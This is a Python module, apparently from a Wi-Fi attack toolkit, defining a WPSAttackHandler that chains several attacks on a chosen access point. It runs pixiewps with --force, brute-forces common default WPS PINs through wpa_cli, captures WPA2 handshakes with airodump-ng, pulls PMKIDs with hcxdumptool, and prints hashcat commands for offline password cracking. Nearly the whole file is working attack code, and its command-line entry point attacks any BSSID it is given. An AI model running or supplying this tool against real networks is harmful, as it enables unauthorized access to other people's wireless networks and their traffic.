#!/usr/bin/env python3
"""
pixiewps_integration.py

WPS attack helper adapted for FARHAN-Shot integration.
Provides WPSAttackHandler with fallbacks: pixiewps --force,
common PINs, handshake capture (airodump-ng) and PMKID extraction (hcxdumptool).

This is a standalone module intended to be placed in tools/ in the repo.
"""

import subprocess
import json
import re
import time
import os
from datetime import datetime

class WPSAttackHandler:
    """Handles WPS attacks with comprehensive fallback mechanisms"""

    # Common WPS PINs for quick fallback
    COMMON_PINS = [
        "12345670", "00000000", "11111111", "12341234",
        "88888888", "19283746", "99999999", "11223344"
    ]

    def __init__(self, interface, verbose=True):
        self.interface = interface
        self.verbose = verbose
        self.results = {}

    def log(self, level, msg):
        """Unified logging"""
        if self.verbose or level in ["SUCCESS", "ERROR"]:
            timestamp = datetime.now().strftime("%H:%M:%S")
            symbols = {
                "INFO": "[i]",
                "SUCCESS": "[+]",
                "ERROR": "[-]",
                "WARN": "[!]",
                "DEBUG": "[*]"
            }
            print(f"{symbols.get(level, '[*]')} [{timestamp}] {msg}")

    def _parse_pin_from_output(self, output: str):
        # Look for 8-digit PIN anywhere in pixiewps output lines
        m = re.search(r"(\b\d{8}\b)", output)
        if m:
            return m.group(1)
        return None

    def run_pixiewps_with_force(self, pke, pkr, e_hash1, e_hash2, authkey, e_nonce, timeout=30):
        """Run Pixiewps with --force flag for aggressive extraction"""
        self.log("INFO", "Attempting pixiewps with --force flag...")

        cmd = [
            "pixiewps",
            "--pke", pke,
            "--pkr", pkr,
            "--e-hash1", e_hash1,
            "--e-hash2", e_hash2,
            "--authkey", authkey,
            "--e-nonce", e_nonce,
            "--force",
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            output = (result.stdout or "") + (result.stderr or "")
            pin = self._parse_pin_from_output(output)
            if pin:
                self.log("SUCCESS", f"PIN found with pixiewps --force: {pin}")
                return {"pin": pin, "method": "pixiewps_force", "output": output}
            else:
                self.log("DEBUG", f"pixiewps output (truncated):\n{output[:1000]}")
                return None
        except subprocess.TimeoutExpired:
            self.log("WARN", "pixiewps --force timed out")
            return None
        except FileNotFoundError:
            self.log("ERROR", "pixiewps binary not found. Install pixiewps or set PATH.")
            return None
        except Exception as e:
            self.log("ERROR", f"pixiewps execution failed: {e}")
            return None

    def try_wps_pin(self, bssid, pin, interface, timeout=12):
        """Test if a WPS PIN is valid using wpa_cli (returns True/False)."""
        try:
            cmd = ["wpa_cli", "-i", interface, "wps_reg", bssid, pin]
            self.log("DEBUG", f"Running: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            out = (result.stdout or "") + (result.stderr or "")
            if result.returncode == 0 and ("OK" in out or "SUCCESS" in out.upper()):
                return True
            # Some wpa_cli builds return textual feedback
            if re.search(r"WPS.*PIN.*(succeeded|success|got psk)", out, re.IGNORECASE):
                return True
            return False
        except FileNotFoundError:
            # wpa_cli not present
            self.log("WARN", "wpa_cli not found. Skipping PIN test via wpa_cli.")
            return False
        except Exception as e:
            self.log("DEBUG", f"try_wps_pin exception: {e}")
            return False

    def test_common_pins(self, bssid, essid, interface):
        """Test common default WPS PINs"""
        self.log("INFO", "Testing common WPS PINs...")

        for i, pin in enumerate(self.COMMON_PINS, 1):
            self.log("INFO", f"[{i}/{len(self.COMMON_PINS)}] Testing PIN: {pin}")
            if self.try_wps_pin(bssid, pin, interface):
                self.log("SUCCESS", f"PIN accepted: {pin}")
                return {"pin": pin, "method": "common_pin_bruteforce"}
            time.sleep(0.8)

        self.log("WARN", "None of the common PINs worked")
        return None

    def capture_handshake(self, bssid, essid, channel, timeout=25):
        """Capture WPA2 handshake (airodump-ng) for offline cracking."""
        self.log("INFO", f"Capturing WPA2 handshake for {essid} ({bssid}) on channel {channel}...")
        safe_essid = re.sub(r"[^A-Za-z0-9_-]", "_", essid)[:24]
        pcap_prefix = f"/tmp/{safe_essid}_{bssid.replace(':','')}_capture"

        try:
            cmd = [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", str(channel),
                "-w", pcap_prefix,
                self.interface
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.log("DEBUG", f"airodump-ng pid={proc.pid} capturing for {timeout}s...")
            time.sleep(timeout)
            proc.terminate()
            cap_file = f"{pcap_prefix}-01.cap"
            if os.path.exists(cap_file):
                self.log("SUCCESS", f"Handshake captured: {cap_file}")
                return {"handshake": cap_file, "method": "wpa2_handshake", "note": f"hashcat -m 22000 {cap_file} wordlist.txt"}
            else:
                self.log("WARN", f"Handshake capture file not found: {cap_file}")
                return None
        except FileNotFoundError:
            self.log("WARN", "airodump-ng not found. Install aircrack-ng package to capture handshakes.")
            return None
        except Exception as e:
            self.log("ERROR", f"Handshake capture error: {e}")
            return None

    def extract_pmkid(self, bssid, essid, timeout=15):
        """Extract PMKID using hcxdumptool for offline cracking."""
        self.log("INFO", "Attempting PMKID extraction with hcxdumptool...")
        safe = bssid.replace(':','')
        out_file = f"/tmp/pmkid_{safe}.pcapng"
        try:
            cmd = [
                "hcxdumptool",
                "--interface", self.interface,
                "--bssid", bssid,
                "-o", out_file,
                "--enable_status=3"
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.log("DEBUG", f"hcxdumptool pid={proc.pid} extracting for {timeout}s...")
            time.sleep(timeout)
            proc.terminate()
            if os.path.exists(out_file) and os.path.getsize(out_file) > 100:
                self.log("SUCCESS", f"PMKID extracted: {out_file}")
                return {"pmkid": out_file, "method": "pmkid_offline", "note": f"hashcat -m 16800 {out_file} wordlist.txt"}
            else:
                self.log("WARN", "PMKID extraction failed or output too small")
                return None
        except FileNotFoundError:
            self.log("WARN", "hcxdumptool not found. Install with: sudo apt install hcxdumptool")
            return None
        except Exception as e:
            self.log("ERROR", f"PMKID extraction error: {e}")
            return None

    def comprehensive_attack(self, bssid, essid, pke=None, pkr=None, e_hash1=None, e_hash2=None, authkey=None, e_nonce=None, channel=6):
        """Execute comprehensive WPS attack with multiple fallbacks"""
        self.log("INFO", "=" * 60)
        self.log("INFO", f"Starting comprehensive WPS attack on {essid} ({bssid})")
        self.log("INFO", "=" * 60)

        result = {
            "bssid": bssid,
            "essid": essid,
            "success": False,
            "pin": None,
            "method": None,
            "handshake": None,
            "pmkid": None,
            "alternatives": []
        }

        # Stage 1: pixiewps with --force
        if pke and pkr and e_hash1 and e_hash2 and authkey and e_nonce:
            self.log("INFO", "Stage 1: pixiewps (forced)")
            pix_result = self.run_pixiewps_with_force(pke, pkr, e_hash1, e_hash2, authkey, e_nonce)
            if pix_result and pix_result.get("pin"):
                result["pin"] = pix_result["pin"]
                result["method"] = pix_result["method"]
                result["success"] = True
                self.log("SUCCESS", "Attack succeeded via pixiewps!")
                return result

        # Stage 2: Common PIN brute-force
        self.log("INFO", "Stage 2: Common PIN brute-force")
        pin_result = self.test_common_pins(bssid, essid, self.interface)
        if pin_result and pin_result.get("pin"):
            result["pin"] = pin_result["pin"]
            result["method"] = pin_result["method"]
            result["success"] = True
            self.log("SUCCESS", "Attack succeeded via common PIN!")
            return result

        # Stage 3: Handshake capture
        self.log("INFO", "Stage 3: WPA2 Handshake capture")
        hs_result = self.capture_handshake(bssid, essid, channel, timeout=25)
        if hs_result:
            result["handshake"] = hs_result["handshake"]
            result["alternatives"].append(hs_result)
            self.log("SUCCESS", "Handshake captured - use offline cracking")

        # Stage 4: PMKID extraction
        self.log("INFO", "Stage 4: PMKID extraction")
        pmkid_result = self.extract_pmkid(bssid, essid, timeout=15)
        if pmkid_result:
            result["pmkid"] = pmkid_result["pmkid"]
            result["alternatives"].append(pmkid_result)
            self.log("SUCCESS", "PMKID extracted - use offline cracking")

        if result["success"]:
            self.log("SUCCESS", "PIN successfully obtained!")
        else:
            if result["alternatives"]:
                self.log("WARN", f"PIN not found, but captured {len(result['alternatives'])} offline cracking option(s)")
                self.log("INFO", "Alternatives for offline cracking:")
                for alt in result["alternatives"]:
                    self.log("INFO", f"  - {alt.get('note', 'N/A')}")
            else:
                self.log("ERROR", "All attack stages failed - target may be invulnerable")

        return result


if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 pixiewps_integration.py <BSSID>")
        sys.exit(1)
    bssid = sys.argv[1]
    handler = WPSAttackHandler('wlan0mon')
    res = handler.comprehensive_attack(bssid=bssid, essid='TestNetwork', channel=6)
    print(json.dumps(res, indent=2))
